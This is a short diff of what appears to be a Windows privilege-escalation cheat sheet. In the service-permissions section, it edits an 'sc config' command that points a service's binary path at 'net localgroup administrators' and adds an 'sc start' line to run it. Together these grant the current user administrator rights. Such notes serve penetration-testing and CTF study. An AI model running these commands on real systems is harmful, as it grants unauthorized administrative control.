@@ -73,7 +73,8 @@ Look for SERVICE_CHANGE_CONFIG and SERVICE_START
 
      accesschk.exe /accepteula -wuvc [svc name]         
      
-     sc config [svc name] binpath= "net localgroup administrators user /add"      
+     sc config [svc name] binpath= "net localgroup administrators [username] /add"   
+     sc start [service name]   
 ## Registry Exploits
 ### Autoruns   
 Search
